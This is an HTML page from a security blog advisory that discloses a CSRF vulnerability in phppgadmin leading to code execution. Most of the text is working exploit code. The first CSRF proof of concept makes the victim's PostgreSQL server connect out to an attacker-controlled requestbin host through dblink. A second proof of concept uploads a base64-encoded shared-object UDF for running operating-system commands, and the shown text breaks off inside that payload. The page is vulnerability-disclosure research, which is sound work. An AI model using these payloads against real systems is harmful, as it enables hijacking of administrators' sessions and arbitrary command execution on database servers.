@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>phppgadmin CSRF to Code Execution</title>
+  <meta name="description" content="This advisory discloses a CSRF vulnerability that exists in phppgadmin/phppgadmin. The details that was sent to the maintainer can be seen here: phppgadmin%2...">
+  
+  <meta name="author" content="Sam Sanoop">
+  <meta name="copyright" content="&copy; Sam Sanoop 2021">
+  
+
+  <!-- External libraries -->
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai-sublime.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">
+
+  <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
+  <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
+  <link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
+  <link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
+  <link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
+  <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
+  <link rel="manifest" href="/assets/icons/manifest.json">
+  <meta name="msapplication-TileColor" content="#ffffff">
+  <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  
+  <!-- Facebook OGP cards -->
+  <meta property="og:description" content="This advisory discloses a CSRF vulnerability that exists in phppgadmin/phppgadmin. The details that was sent to the maintainer can be seen here: phppgadmin%2..." />
+  <meta property="og:url" content="http://snoopysecurity.github.io" />
+  <meta property="og:site_name" content="💻 | Blog" />
+  <meta property="og:title" content="phppgadmin CSRF to Code Execution" />
+  <meta property="og:type" content="website" />
+  <meta property="og:image" content="http://snoopysecurity.github.io/assets/logo.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="612" />
+  <meta property="og:image:height" content="605" />
+  
+
+  
+  <!-- Twitter: card tags -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="phppgadmin CSRF to Code Execution">
+  <meta name="twitter:description" content="This advisory discloses a CSRF vulnerability that exists in phppgadmin/phppgadmin. The details that was sent to the maintainer can be seen here: phppgadmin%2...">
+  <meta name="twitter:image" content="http://snoopysecurity.github.io/assets/logo.png">
+  <meta name="twitter:url" content="http://snoopysecurity.github.io">
+  
+
+  
+
+  <!-- Site styles -->
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://snoopysecurity.github.io/web-application-security/2018/07/28/28_phppgadmin_csrf_to_code-execution.html">
+  <link rel="alternate" type="application/rss+xml" title="💻 | Blog" href="http://snoopysecurity.github.io/feed.xml" />
+</head>
+
+
+  <body>
+
+    <header class="navigation" role="banner">
+  <div class="navigation-wrapper">
+    <a href="/" class="logo">
+      
+      <img src="/assets/logo.png" alt="💻 | Blog">
+      
+    </a>
+    <a href="javascript:void(0)" class="navigation-menu-button" id="js-mobile-menu">
+      <i class="fa fa-bars"></i>
+    </a>
+    <nav role="navigation">
+      <ul id="js-navigation-menu" class="navigation-menu show">
+        
+          
+          <li class="nav-link"><a href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+          <li class="nav-link"><a href="/posts/">Posts</a>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+        <div class="post">
+
+<div class="post-header-container " >
+  <div class="scrim ">
+    <header class="post-header">
+      <h1 class="title">phppgadmin CSRF to Code Execution</h1>
+      <p class="info">by <strong>snoopysecurity</strong></p>
+    </header>
+  </div>
+</div>
+
+<div class="wrapper">
+
+ <span class="page-divider">
+  <span class="one"></span>
+  <span class="two"></span>
+</span>
+ 
+
+<section class="post-meta">
+  <div class="post-date">July 28, 2018</div>
+  <div class="post-categories">
+  in 
+    
+    <a href="/category/web-application-security">Web-application-security</a>
+    
+  
+  </div>
+</section>
+
+<article class="post-content">
+  <p>This advisory discloses a CSRF vulnerability that exists in <a href="https://github.com/phppgadmin/phppgadmin">phppgadmin/phppgadmin</a>. The details that was sent to the maintainer can be seen here: <a href="https://github.com/snoopysecurity/Public/blob/master/phppgadmin%20CSRF%20Vulnerability.pdf">phppgadmin%20CSRF%20Vulnerability.pdf</a></p>
+
+<h2 id="csrf-introduction">CSRF Introduction</h2>
+
+<p>When a web server receives a request, the request should be validated before it initiates any action on the server. Checking the
+session ID or authorisation cookie is not sufficient, because these cookies are sent automatically by a user’s browser even if the user
+did not knowingly make the request.</p>
+
+<p>The <strong>SQL dashboard</strong> area within <strong>phppgadmin</strong> allows sensitive actions to be performed without validating that the request originated
+from the application. This could enable an attacker to trick a user into performing these actions unknowingly through a Cross Site
+Request Forgery (CSRF) attack.</p>
+
+<h2 id="impact">Impact</h2>
+
+<p>By leveraging this vulnerability, an attacker might be able to gain unauthorized access to information, stored in database, execute
+arbitrary commands on the server, compromise the entire application and perform attacks against application users and company’s
+infrastructure.</p>
+
+<p><strong>Multiple areas within the application is vulnearable to CSRF</strong>. One such area is the <strong>database.php</strong> webpage.</p>
+
+<p>The vulnerability exists due to failure in the database.php webpage not verifying the source of HTTP request. A remote attacker can
+trick a logged-in administrator to visit a malicious page with <strong>CSRF exploit and execute arbitrary system commands on the server</strong>.</p>
+
+<p>The proof of concept below when visited, will send a HTTP POST request to vulnerable application and instructs the backend postgres database to make a HTTP request to an attacker-controlled server by utilising the <strong>CREATE</strong> command.</p>
+
+<h3 id="proof-of-concept-to-identify-if-a-phppgadmin-instance-is-vulnerable-through-out-of-band-technique">Proof of Concept to identify if a phppgadmin instance is vulnerable through Out of Band Technique</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">function</span> <span class="nx">submitRequest</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"POST"</span><span class="p">,</span> <span class="s2">"http:\/\/phppgadmin.local:49161\/phppgadmin\/sql.php"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">"Accept"</span><span class="p">,</span>
+<span class="s2">"text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8"</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">"Accept-Language"</span><span class="p">,</span> <span class="s2">"en-GB,en;q=0.5"</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">"Content-Type"</span><span class="p">,</span> <span class="s2">"multipart\/form-data;
+boundary=---------------------------317222262731323"</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="s2">"-----------------------------317222262731323\r\n"</span> <span class="o">+</span>
+<span class="s2">"Content-Disposition: form-data; name=\"query\"\r\n"</span> <span class="o">+</span>
+<span class="s2">"\r\n"</span> <span class="o">+</span>
+<span class="s2">"CREATE EXTENSION dblink;SELECT
+dblink_connect(\'host=mydatahere.b940ab686a17804777c0.d.requestbin.net user=postgres
+password=password dbname=dvdrental\');\r\n"</span> <span class="o">+</span>
+<span class="s2">"-----------------------------317222262731323\r\n"</span> <span class="o">+</span>
+<span class="s2">"Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n"</span> <span class="o">+</span>
+<span class="s2">"\r\n"</span> <span class="o">+</span>
+<span class="s2">"2097152\r\n"</span> <span class="o">+</span>
+<span class="s2">"-----------------------------317222262731323\r\n"</span> <span class="o">+</span>
+<span class="s2">"Content-Disposition: form-data; name=\"script\"; filename=\"\"\r\n"</span> <span class="o">+</span>
+<span class="s2">"Content-Type: application/octet-stream\r\n"</span> <span class="o">+</span>
+<span class="s2">"\r\n"</span> <span class="o">+</span>
+<span class="s2">"\r\n"</span> <span class="o">+</span>
+<span class="s2">"-----------------------------317222262731323\r\n"</span> <span class="o">+</span>
+<span class="s2">"Content-Disposition: form-data; name=\"execute\"\r\n"</span> <span class="o">+</span>
+<span class="s2">"\r\n"</span> <span class="o">+</span>
+<span class="s2">"Execute\r\n"</span> <span class="o">+</span>
+<span class="s2">"-----------------------------317222262731323\r\n"</span> <span class="o">+</span>
+<span class="s2">"Content-Disposition: form-data; name=\"server\"\r\n"</span> <span class="o">+</span>
+<span class="s2">"\r\n"</span> <span class="o">+</span>
+<span class="s2">"localhost:5432:allow\r\n"</span> <span class="o">+</span>
+<span class="s2">"-----------------------------317222262731323\r\n"</span> <span class="o">+</span>
+<span class="s2">"Content-Disposition: form-data; name=\"database\"\r\n"</span> <span class="o">+</span>
+<span class="s2">"\r\n"</span> <span class="o">+</span>
+<span class="s2">"postgres\r\n"</span> <span class="o">+</span>
+<span class="s2">"-----------------------------317222262731323--\r\n"</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">aBody</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">aBody</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
+<span class="nx">aBody</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">body</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">aBody</span><span class="p">]));</span>
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"#"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="na">onclick=</span><span class="s">"submitRequest();"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre>
+</div>
+
+<p><strong>dblink_connect()</strong> establishes a connection to a remote PostgreSQL database. This can be used to connect to an attacker controlled
+server and verify the CSRF attack succeed.</p>
+
+<h3 id="request-that-gets-sent-from-the-above-proof-of-concept-when-executed-by-a-victim">Request that gets sent from the above Proof Of Concept when executed by a victim</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>POST /phppgadmin/sql.php HTTP/1.1
+Host: phppgadmin.local:49161
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------317222262731323
+Content-Length: 886
+Origin: null
+Connection: close
+Cookie: PPA_ID=npk16gm33btgv8vca9a65di3s1;
+webfx-tree-cookie-persistence=wfxt-4+wfxt-6+wfxt-8+wfxt-10+wfxt-12
+-----------------------------317222262731323
+Content-Disposition: form-data; name="query"
+CREATE EXTENSION dblink;SELECT
+dblink_connect('host=mydatahere.b940ab686a17804777c0.d.requestbin.net user=postgres
+password=password dbname=dvdrental');
+-----------------------------317222262731323
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+2097152
+-----------------------------317222262731323
+Content-Disposition: form-data; name="script"; filename=""
+Content-Type: application/octet-stream
+-----------------------------317222262731323
+Content-Disposition: form-data; name="execute"
+Execute
+-----------------------------317222262731323
+Content-Disposition: form-data; name="server"
+localhost:5432:allow
+-----------------------------317222262731323
+Content-Disposition: form-data; name="database"
+postgres
+-----------------------------317222262731323--
+</code></pre>
+</div>
+
+<p><img src="/assets/phppg1.png" alt="" /></p>
+
+<p>Steps to Reproduce</p>
+
+<ul>
+  <li>Take the HTML proof of concept, make changes to reflect target domain where the phppgadmin instance is hosted</li>
+  <li>Login to the vulnerable phppgadmin instance as a privileged user such as ‘postgres’</li>
+  <li>Visit the proof of concept file within the same browser to click submit to execute the CSRF attack</li>
+</ul>
+
+<h2 id="remote-code-execution">Remote Code Execution</h2>
+
+<p>Postgres also allows a user to interact with the underlying operating system giving to the database administrator or to a malicious user, potentially a remote attacker through a SQL injection vulnerability, the possibility to execute operating system commands as well as read and write files on the file system.</p>
+
+<p>The following proof of concept can be used to upload a user-defined function (UDF) in PostgresSQL and execute commands on the
+underlying operating system.</p>
+
+<p><strong>Note:</strong> the following proof of concept has been tailored to only execute commands on an Ubuntu 18.04 target system.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">function</span> <span class="nx">submitRequest</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"POST"</span><span class="p">,</span> <span class="s2">"http:\/\/192.168.1.78\/phppgadmin\/sql.php"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">"Accept"</span><span class="p">,</span>
+<span class="s2">"text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8"</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">"Accept-Language"</span><span class="p">,</span> <span class="s2">"en-GB,en;q=0.5"</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">"Content-Type"</span><span class="p">,</span> <span class="s2">"multipart\/form-data;
+boundary=---------------------------297112967428312"</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="s2">"-----------------------------297112967428312\r\n"</span> <span class="o">+</span>
+<span class="s2">"Content-Disposition: form-data; name=\"query\"\r\n"</span> <span class="o">+</span>
+<span class="s2">"\r\n"</span> <span class="o">+</span>
+<span class="s2">"SELECT lo_create(43213);\r\n"</span> <span class="o">+</span>
+<span class="s2">"INSERT INTO pg_largeobject (loid, pageno, data) values (43213, 0,
+decode(\'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\',
+\'base64\'));\r\n"</span> <span class="o">+</span>
+<span class="s2">"INSERT INTO pg_largeobject (loid, pageno, data) values (43213, 1,
+decode(\'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAGAAAAAAAAI
+AYAAAAAAAABAAAAAAAAAIcAAAAAAAAADAAAAAAAAABABQAAAAAAAA0AAAAAAAAAsAYAAAAAAAAZAAAAAAAAABAOIAAAAAAA
+GwAAAAAAAAAIAAAAAAAAABoAAAAAAAAAGA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAA
+AiAMAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAAC1AAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAA
+AAAgAAAAAAAAAYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAACgFAAAAAAAABwAAAAAAAACABAAAAAAAAAgAAAAAA
+AAAqAAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABgBAAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAAD4EAAAA
+AAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\',
+\'base64\'));\r\n"</span> <span class="o">+</span>
+<span class="s2">"INSERT INTO pg_largeobject (loid, pageno, data) values (43213, 2,
+decode(\'IA4gAAAAAAAAAAAAAAAAAAAAAAAAAAAAdgUAAAAAAAAgECAAAAAAAEdDQzogKFVidW50dSA3LjMuMC0xNnVidW
+50dTMpIDcuMy4wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABAMgBAAAAAAAAAAAAAAAAAAAAAAAAAwACA
+PABAAAAAAAAAAAAAAAAAAAAAAAAAwADADgCAAAAAAAAAAAAAAAAAAAAAAAAAwAEAIgDAAAAAAAAAAAAAAAAAAAAAAAAAwAF
+AD4EAAAAAAAAAAAAAAAAAAAAAAAAAwAGAGAEAAAAAAAAAAAAAAAAAAAAAAAAAwAHAIAEAAAAAAAAAAAAAAAAAAAAAAAAAwA
+IACgFAAAAAAAAAAAAAAAAAAAAAAAAAwAJAEAFAAAAAAAAAAAAAAAAAAAAAAAAAwAKAGAFAAAAAAAAAAAAAAAAAAAAAAAAAw
+ALAIAFAAAAAAAAAAAAAAAAAAAAAAAAAwAMAJAFAAAAAAAAAAAAAAAAAAAAAAAAAwANALAGAAAAAAAAAAAAAAAAAAAAAAAAA
+wAOAMAGAAAAAAAAAAAAAAAAAAAAAAAAAwAPAOAGAAAAAAAAAAAAAAAAAAAAAAAAAwAQABgHAAAAAAAAAAAAAAAAAAAAAAAA
+AwARABAOIAAAAAAAAAAAAAAAAAAAAAAAAwASABgOIAAAAAAAAAAAAAAAAAAAAAAAAwATACAOIAAAAAAAAAAAAAAAAAAAAAA
